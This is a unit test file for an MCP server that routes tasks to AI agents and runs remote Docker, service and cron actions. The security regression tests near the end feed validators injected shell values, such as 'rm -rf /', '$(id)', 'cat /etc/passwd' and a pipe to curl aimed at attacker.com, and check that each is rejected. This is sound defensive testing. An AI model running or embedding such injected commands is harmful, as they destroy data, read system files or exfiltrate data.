/**
 * Unit tests for elvatis-mcp pure functions.
 *
 * Run with: npm test
 *
 * Uses Node's built-in test runner (node:test) so no extra dependencies needed.
 * Tests only pure/deterministic logic (no SSH, no HTTP, no CLI spawning).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { matchRules, ROUTING_RULES, KNOWN_AGENTS, ROUTING_GUIDE } from '../src/tools/routing-rules.js';
import { handlePromptSplit } from '../src/tools/splitter.js';
import { handleMcpHelp } from '../src/tools/help.js';
import {
  initRateLimiter, checkRateLimit, recordUsage, getAllQuotas, getCostSummary,
} from '../src/rate-limiter.js';
import { toRemoteSshCfg } from '../src/tools/remote-shell.js';
import { handleRemoteDocker } from '../src/tools/remote-docker.js';
import { handleRemoteService } from '../src/tools/remote-service.js';
import { handleOpenclawDeploy } from '../src/tools/openclaw-deploy.js';
import {
  validateContainerName,
  validateServiceName,
  validateAgentName,
  validateScheduleValue,
  validateCronId,
  shellQuote,
} from '../src/validate.js';
import { handleCronCreate, handleCronDelete, handleCronHistory } from '../src/tools/cron-manage.js';
import type { Config } from '../src/config.js';

// Minimal config stub for heuristic-only tests (no SSH/HTTP needed)
const stubConfig: Config = {
  sshHost: '',
  haUrl: '',
  haToken: '',
  localLlmEndpoint: 'http://localhost:1234/v1',
  localLlmModel: '',
  geminiModel: 'gemini-2.5-flash',
  remotePort: 22,
  remoteUser: 'root',
  remoteKeyPath: '~/.ssh/id_rsa',
};

// ============================================================================
// matchRules() — keyword routing engine
// ============================================================================

describe('matchRules', () => {
  it('routes coding keywords to codex_run', () => {
    const matches = matchRules('Fix the bug in the login function');
    assert.ok(matches.length > 0, 'should have at least one match');
    assert.equal(matches[0]!.tool, 'codex_run');
  });

  it('routes analysis keywords to gemini_run', () => {
    const matches = matchRules('Summarize this research paper');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'gemini_run');
  });

  it('routes classification to local_llm_run', () => {
    const matches = matchRules('Classify these items as positive or negative');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'local_llm_run');
  });

  it('routes trading keywords to openclaw_run', () => {
    const matches = matchRules('Check my portfolio performance');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_run');
  });

  it('routes light control to home_light', () => {
    const matches = matchRules('Turn on the living room lights');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_light');
  });

  it('routes sensor queries to home_sensors', () => {
    const matches = matchRules('Read all sensor data');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_sensors');
  });

  it('routes climate control to home_climate', () => {
    const matches = matchRules('Set the thermostat to 22 degrees');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_climate');
  });

  it('routes vacuum commands to home_vacuum', () => {
    const matches = matchRules('Start the robot vacuum');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_vacuum');
  });

  it('routes memory search to openclaw_memory_search', () => {
    const matches = matchRules('Search my memory for meeting notes');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_memory_search');
  });

  it('routes memory write to openclaw_memory_write', () => {
    const matches = matchRules('Remember this: the API key expires next week');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_memory_write');
  });

  it('routes notifications to openclaw_notify', () => {
    const matches = matchRules('Send the results via WhatsApp');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_notify');
  });

  it('uses word boundary matching (no partial matches)', () => {
    // "reviews" should NOT match "review" as a keyword for claude_run
    const matches = matchRules('Classify these customer reviews');
    // Should route to local_llm_run (classify keyword), not claude_run
    assert.ok(matches.length > 0);
    assert.notEqual(matches[0]!.tool, 'claude_run');
  });

  it('handles multi-word phrase matching', () => {
    const matches = matchRules('I need a short answer about this topic');
    const localMatch = matches.find(m => m.tool === 'local_llm_run');
    assert.ok(localMatch, 'should match local_llm_run via "short answer" phrase');
  });

  it('returns empty array for unrecognized input', () => {
    const matches = matchRules('xyzzy foobar blergh');
    assert.equal(matches.length, 0);
  });

  it('sorts matches by score descending', () => {
    const matches = matchRules('debug the TypeScript function bug and fix the compile error');
    assert.ok(matches.length > 0);
    for (let i = 1; i < matches.length; i++) {
      assert.ok(matches[i]!.score <= matches[i - 1]!.score, 'should be sorted by score desc');
    }
  });
});

// ============================================================================
// ROUTING_RULES / KNOWN_AGENTS / ROUTING_GUIDE — structural checks
// ============================================================================

describe('routing constants', () => {
  it('ROUTING_RULES has entries for all major tool categories', () => {
    const tools = new Set(ROUTING_RULES.map(r => r.tool));
    assert.ok(tools.has('codex_run'), 'should have codex_run');
    assert.ok(tools.has('gemini_run'), 'should have gemini_run');
    assert.ok(tools.has('claude_run'), 'should have claude_run');
    assert.ok(tools.has('openclaw_run'), 'should have openclaw_run');
    assert.ok(tools.has('local_llm_run'), 'should have local_llm_run');
    assert.ok(tools.has('home_light'), 'should have home_light');
    assert.ok(tools.has('home_sensors'), 'should have home_sensors');
    assert.ok(tools.has('home_climate'), 'should have home_climate');
  });

  it('every rule has non-empty keywords and reason', () => {
    for (const rule of ROUTING_RULES) {
      assert.ok(rule.keywords.length > 0, `${rule.tool} should have keywords`);
      assert.ok(rule.reason.length > 0, `${rule.tool} should have a reason`);
    }
  });

  it('KNOWN_AGENTS includes all routing rule tools', () => {
    for (const rule of ROUTING_RULES) {
      // Skip combined tool entries (tool1 / tool2 / tool3)
      if (rule.tool.includes(' / ')) continue;
      assert.ok(KNOWN_AGENTS.has(rule.tool), `KNOWN_AGENTS should include ${rule.tool}`);
    }
  });

  it('ROUTING_GUIDE mentions all sub-agent tools', () => {
    for (const tool of ['claude_run', 'codex_run', 'gemini_run', 'openclaw_run', 'local_llm_run']) {
      assert.ok(ROUTING_GUIDE.includes(tool), `guide should mention ${tool}`);
    }
  });
});

// ============================================================================
// handlePromptSplit (heuristic strategy) — splitting logic
// ============================================================================

describe('prompt_split heuristic', () => {
  it('single coding prompt returns 1 task with codex_run', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Fix the authentication bug in the login handler',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 1);
    assert.equal(plan.subtasks[0]!.agent, 'codex_run');
    assert.equal(plan.parallelizable_groups.length, 1);
  });

  it('single analysis prompt returns 1 task with gemini_run', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Summarize this 50-page research paper on quantum computing',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 1);
    assert.equal(plan.subtasks[0]!.agent, 'gemini_run');
  });

  it('splits "then" connector into sequential tasks', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Refactor the auth module, then ask Gemini to review the changes',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 2);
    assert.equal(plan.subtasks[0]!.agent, 'codex_run');
    assert.equal(plan.subtasks[1]!.agent, 'gemini_run');
  });

  it('splits "also" connector into parallel tasks', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Check my portfolio performance and also turn on the living room lights',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 2);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('openclaw_run'));
    assert.ok(agents.includes('home_light'));
  });

  it('splits comma-separated clauses targeting different agents', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Check the server status via OpenClaw, debug the failing test with Codex, have Claude review the fix, use the local model to format the report as markdown, and send the results via WhatsApp',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 5);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('openclaw_run'), 'should have openclaw_run');
    assert.ok(agents.includes('codex_run'), 'should have codex_run');
    assert.ok(agents.includes('claude_run'), 'should have claude_run');
    assert.ok(agents.includes('local_llm_run'), 'should have local_llm_run');
    assert.ok(agents.includes('openclaw_notify'), 'should have openclaw_notify');
  });

  it('handles home automation chains with conditional logic', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Read all sensor data, then if CO2 is above 1000ppm turn on the ventilation, dim the bedroom lights to 20%, and set the thermostat to 19 degrees',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 4);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('home_sensors'), 'should have home_sensors');
    assert.ok(agents.includes('home_climate'), 'should have home_climate');
    // home_light should appear for the light dimming task
    assert.ok(agents.filter(a => a === 'home_light').length >= 1, 'should have home_light');
  });

  it('returns valid parallelizable_groups', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Refactor the auth module, then check my portfolio and also turn on the lights',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.parallelizable_groups.length >= 1);
    // All task IDs should appear in exactly one group
    const allIds = plan.parallelizable_groups.flat();
    const taskIds = plan.subtasks.map(t => t.id);
    assert.deepEqual(new Set(allIds), new Set(taskIds));
  });

  it('populates model and estimated time', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Fix the bug in the auth module',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.estimated_total_seconds > 0, 'should estimate time');
    assert.ok(plan.subtasks[0]!.model, 'should have a model suggestion');
    assert.ok(plan.strategy_used.includes('heuristic'), 'should report heuristic strategy');
  });

  it('includes note with execution instructions', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Do two things: fix the bug and check the portfolio',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.note.length > 0, 'should include a note');
  });
});

// ============================================================================
// handleMcpHelp — routing guide and task recommendations
// ============================================================================

describe('mcp_help', () => {
  it('returns routing guide without task', async () => {
    const result = await handleMcpHelp({});
    assert.ok(result.guide.length > 0, 'should return guide');
    assert.ok(result.guide.includes('local_llm_run'), 'guide should mention local_llm_run');
    assert.ok(result.guide.includes('prompt_split'), 'guide should mention prompt_split');
  });

  it('routes coding task to codex_run', async () => {
    const result = await handleMcpHelp({ task: 'debug the TypeScript compile error and fix the bug' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('codex_run'), 'should recommend codex_run');
  });

  it('routes formatting task to local_llm_run', async () => {
    const result = await handleMcpHelp({ task: 'reformat this CSV data as a markdown table' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('local_llm_run'), 'should recommend local_llm_run');
  });

  it('routes home automation task to home tool', async () => {
    const result = await handleMcpHelp({ task: 'turn on the bedroom lights' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('home_light'), 'should recommend home_light');
  });

  it('routes trading task to openclaw_run', async () => {
    const result = await handleMcpHelp({ task: 'check my stock portfolio and current positions' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('openclaw_run'), 'should recommend openclaw_run');
  });
});

// ============================================================================
// Rate limiter — usage tracking and quota enforcement
// ============================================================================

describe('rate limiter', () => {
  // Use a temp dir that doesn't exist (no file I/O side effects)
  const tempDir = '/tmp/elvatis-mcp-test-' + Date.now();

  it('initializes without errors', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
  });

  it('allows calls when under limit', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.allowed, true);
    assert.equal(quota.usage.lastMinute, 0);
  });

  it('tracks usage after recordUsage', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    recordUsage('gemini_run');
    recordUsage('gemini_run');
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.usage.lastMinute, 2);
    assert.equal(quota.usage.lastHour, 2);
  });

  it('enforces per-minute rate limit', () => {
    initRateLimiter({ dataDir: tempDir, limits: { gemini_run: { perMinute: 2 } } });
    recordUsage('gemini_run');
    recordUsage('gemini_run');
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.allowed, false);
    assert.ok(quota.reason?.includes('minute'));
  });

  it('does not rate-limit local agents', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quota = checkRateLimit('local_llm_run');
    assert.equal(quota.allowed, true);
    assert.equal(quota.limits.perMinute, 0, 'no limits for local agents');
  });

  it('does not rate-limit home tools', () => {
    const quota = checkRateLimit('home_light');
    assert.equal(quota.allowed, true);
  });

  it('tracks costs per agent', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    recordUsage('claude_run');
    recordUsage('claude_run');
    const summary = getCostSummary();
    assert.ok(summary.total > 0, 'should have non-zero cost');
    assert.ok(summary.agents['claude_run']! > 0, 'should track claude_run cost');
  });

  it('getAllQuotas returns info for all cloud agents', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quotas = getAllQuotas();
    const agents = quotas.map(q => q.agent);
    assert.ok(agents.includes('claude_run'));
    assert.ok(agents.includes('codex_run'));
    assert.ok(agents.includes('gemini_run'));
  });

  it('respects custom limit overrides', () => {
    initRateLimiter({ dataDir: tempDir, limits: { codex_run: { perMinute: 1 } } });
    recordUsage('codex_run');
    const quota = checkRateLimit('codex_run');
    assert.equal(quota.allowed, false);
    assert.equal(quota.limits.perMinute, 1);
  });
});

// ============================================================================
// remote_shell — config helpers
// ============================================================================

describe('remote_shell', () => {
  it('toRemoteSshCfg throws when REMOTE_HOST is not set', () => {
    assert.throws(
      () => toRemoteSshCfg({ ...stubConfig, remoteHost: undefined }),
      /REMOTE_HOST is not configured/,
    );
  });

  it('toRemoteSshCfg returns correct SshConfig when REMOTE_HOST is set', () => {
    const cfg = toRemoteSshCfg({
      ...stubConfig,
      remoteHost: '10.0.0.1',
      remotePort: 2222,
      remoteUser: 'deploy',
      remoteKeyPath: '/home/deploy/.ssh/id_ed25519',
    });
    assert.equal(cfg.host, '10.0.0.1');
    assert.equal(cfg.port, 2222);
    assert.equal(cfg.username, 'deploy');
    assert.equal(cfg.keyPath, '/home/deploy/.ssh/id_ed25519');
  });

  it('toRemoteSshCfg uses default port 22 when not overridden', () => {
    const cfg = toRemoteSshCfg({ ...stubConfig, remoteHost: '10.0.0.2' });
    assert.equal(cfg.port, 22);
  });
});

// ============================================================================
// remote_docker — argument validation (no SSH needed)
// ============================================================================

describe('remote_docker', () => {
  const noHostConfig = { ...stubConfig, remoteHost: undefined };

  it('returns error when REMOTE_HOST is not configured', async () => {
    const result = await handleRemoteDocker({ action: 'list', lines: 50 }, noHostConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /REMOTE_HOST is not configured/);
  });

  it('returns error when container is missing for non-list action', async () => {
    const result = await handleRemoteDocker(
      { action: 'restart', lines: 50 },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /container is required/);
  });

  it('returns error when command is missing for exec action', async () => {
    const result = await handleRemoteDocker(
      { action: 'exec', container: 'nginx', lines: 50 },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /command is required/);
  });
});

// ============================================================================
// remote_service — argument validation (no SSH needed)
// ============================================================================

describe('remote_service', () => {
  const noHostConfig = { ...stubConfig, remoteHost: undefined };

  it('returns error when REMOTE_HOST is not configured', async () => {
    const result = await handleRemoteService({ action: 'list' }, noHostConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /REMOTE_HOST is not configured/);
  });

  it('returns error when service is missing for non-list action', async () => {
    const result = await handleRemoteService(
      { action: 'restart' },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /service is required/);
  });

  it('action field is reflected in the response', async () => {
    const result = await handleRemoteService(
      { action: 'stop' },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.action, 'stop');
  });
});

// ============================================================================
// openclaw_deploy — argument validation (no SSH needed)
// ============================================================================

describe('openclaw_deploy', () => {
  it('reflects service and action in the response on SSH failure', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'api', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    assert.equal(result.service, 'api');
    assert.equal(result.action, 'status');
    assert.equal(result.success, false);
  });

  it('uses default deploy script dir when OPENCLAW_DEPLOY_SCRIPT_DIR is not set', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'worker', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1', deployScriptDir: undefined },
    );
    assert.equal(result.success, false);
    assert.equal(result.service, 'worker');
  });
});

// ============================================================================
// Security regression tests — validate.ts (findings 1-8)
// All validators must reject shell metacharacters, leading hyphens, and "..".
// ============================================================================

describe('validateContainerName (security)', () => {
  // Valid inputs
  it('accepts a plain container name', () => {
    assert.equal(validateContainerName('nginx'), 'nginx');
  });
  it('accepts compose-style names with underscores and digits', () => {
    assert.equal(validateContainerName('project_web_1'), 'project_web_1');
  });
  it('accepts a 64-char hex container ID', () => {
    const id = 'a'.repeat(64);
    assert.equal(validateContainerName(id), id);
  });

  // Injection attempts that must be rejected
  it('rejects semicolon injection (finding 1)', () => {
    assert.throws(() => validateContainerName('myapp; rm -rf /'), /Invalid container name/);
  });
  it('rejects backtick injection', () => {
    assert.throws(() => validateContainerName('app`id`'), /Invalid container name/);
  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateContainerName('app$(id)'), /Invalid container name/);
  });
  it('rejects leading hyphen (flag injection)', () => {
    assert.throws(() => validateContainerName('-v /:/host'), /Invalid container name/);
  });
  it('rejects path traversal via ".."', () => {
    // "../../etc/passwd" starts with "." so the leading-alphanumeric check fires first.
    // Either error message is acceptable; the key point is it throws.
    assert.throws(() => validateContainerName('../../etc/passwd'), /Invalid container name|must not contain/);
  });
  it('rejects newline injection', () => {
    assert.throws(() => validateContainerName('app\nrm -rf /'), /Invalid container name/);
  });
  it('rejects pipe injection (finding 2)', () => {
    assert.throws(() => validateContainerName('name | curl http://attacker.com/steal'), /Invalid container name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateContainerName(''), /must not be empty/);
  });
});

describe('validateServiceName (security)', () => {
  it('accepts a plain service name', () => {
    assert.equal(validateServiceName('nginx'), 'nginx');
  });
  it('accepts service with at-sign instance specifier', () => {
    assert.equal(validateServiceName('getty@tty1.service'), 'getty@tty1.service');
  });
  it('rejects semicolon injection (finding 3)', () => {
    assert.throws(() => validateServiceName('myservice; cat /etc/passwd'), /Invalid service name/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateServiceName('-n 1'), /Invalid service name/);
  });
  it('rejects space in name', () => {
    assert.throws(() => validateServiceName('nginx reload'), /Invalid service name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateServiceName(''), /must not be empty/);
  });
});

describe('validateAgentName (security)', () => {
  it('accepts a short lowercase agent name', () => {
    assert.equal(validateAgentName('ops'), 'ops');
  });
  it('accepts alphanumeric with hyphen', () => {
    assert.equal(validateAgentName('trading-bot'), 'trading-bot');
  });
  it('rejects space (finding 6)', () => {
    assert.throws(() => validateAgentName('ops --local; id'), /Invalid agent name/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateAgentName('--local'), /Invalid agent name/);
  });
  it('rejects semicolons', () => {
    assert.throws(() => validateAgentName('ops;id'), /Invalid agent name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateAgentName(''), /must not be empty/);
  });
});

describe('validateScheduleValue (security)', () => {
  it('accepts a relative interval like "30m"', () => {
    assert.equal(validateScheduleValue('30m'), '30m');
  });
  it('accepts an ISO timestamp', () => {
    assert.equal(validateScheduleValue('2026-04-01T14:00:00'), '2026-04-01T14:00:00');
  });
  it('accepts a relative offset like "+20m"', () => {
    assert.equal(validateScheduleValue('+20m'), '+20m');
  });
  it('rejects semicolon injection (finding 7)', () => {
    assert.throws(() => validateScheduleValue('+1m; malicious'), /Invalid schedule value/);
  });
  it('rejects backtick injection', () => {
    assert.throws(() => validateScheduleValue('`id`'), /Invalid schedule value/);
  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateScheduleValue('$(id)'), /Invalid schedule value/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateScheduleValue(''), /must not be empty/);
  });
});

describe('validateCronId (security)', () => {
  const validUuid = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890';
  it('accepts a well-formed UUID', () => {
    assert.equal(validateCronId(validUuid), validUuid);
  });
  it('rejects a non-UUID string', () => {
    assert.throws(() => validateCronId('not-a-uuid'), /Invalid cron job ID/);
  });
  it('rejects a UUID with injection suffix', () => {
    assert.throws(() => validateCronId(validUuid + '; rm -rf /'), /Invalid cron job ID/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateCronId('-f /etc/passwd'), /Invalid cron job ID/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateCronId(''), /must not be empty/);
  });
});

describe('shellQuote (security)', () => {
  it('wraps plain strings in single quotes', () => {
    assert.equal(shellQuote('nginx'), "'nginx'");
  });
  it('escapes embedded single quotes', () => {
    // Input: it's here  =>  Output: 'it'"'"'s here'
    assert.equal(shellQuote("it's here"), "'it'\\''s here'");
  });
  it('makes semicolons inert', () => {
    const q = shellQuote('a; rm -rf /');
    // The result must start and end with a single quote and not have unquoted semi
    assert.ok(q.startsWith("'"), 'must start with single quote');
    assert.ok(q.endsWith("'"), 'must end with single quote');
    // Shell would interpret this as one argument, no injection possible
    assert.ok(q.includes(';'), 'semicolon is inside quotes and inert');
  });
});

// ============================================================================
// Security regression: handleRemoteDocker rejects injection in container name
// ============================================================================

describe('handleRemoteDocker injection guard (security)', () => {
  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };

  it('rejects a container name with semicolon injection', async () => {
    const result = await handleRemoteDocker(
      { action: 'logs', container: 'myapp; rm -rf /', lines: 50 },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid container name/);
  });

  it('rejects a container name with leading hyphen', async () => {
    const result = await handleRemoteDocker(
      { action: 'start', container: '-v /:/host', lines: 50 },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid container name/);
  });
});

// ============================================================================
// Security regression: handleRemoteService rejects injection in service name
// ============================================================================

describe('handleRemoteService injection guard (security)', () => {
  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };

  it('rejects a service name with semicolon injection', async () => {
    const result = await handleRemoteService(
      { action: 'restart', service: 'myservice; cat /etc/passwd' },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid service name/);
  });

  it('rejects a service name with a space', async () => {
    const result = await handleRemoteService(
      { action: 'start', service: 'nginx reload' },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid service name/);
  });
});

// ============================================================================
// Security regression: handleCronCreate rejects schedule injection (finding 7)
// ============================================================================

describe('handleCronCreate schedule injection guard (security)', () => {
  const cronConfig: Config = {
    ...stubConfig,
    sshHost: '0.0.0.1',
    haUrl: 'http://localhost',
  };

  it('rejects a schedule with semicolon injection in --at value', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'at +1m; malicious' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });

  it('rejects a schedule with space/injection in --every value', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'every 30m; id' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });
});

// ============================================================================
// Security regression: handleCronDelete rejects non-UUID IDs (finding 7)
// ============================================================================

describe('handleCronDelete ID validation (security)', () => {
  const cronConfig: Config = {
    ...stubConfig,
    sshHost: '0.0.0.1',
    haUrl: 'http://localhost',
  };

  it('rejects a non-UUID job ID', async () => {
    const result = await handleCronDelete({ id: 'not-a-uuid; rm -rf /' }, cronConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid cron job ID/);
  });

  it('accepts a well-formed UUID (returns SSH error, not validation error)', async () => {
    const result = await handleCronDelete(
      { id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' },
      cronConfig,
    );
    // SSH to 0.0.0.1 will fail; that is expected. The important thing is the
    // error is NOT about UUID validation.
    if (!result.success) {
      assert.ok(
        !(result.error ?? '').includes('Invalid cron job ID'),
        'error should be SSH-level, not UUID validation',
      );
    }
  });
});
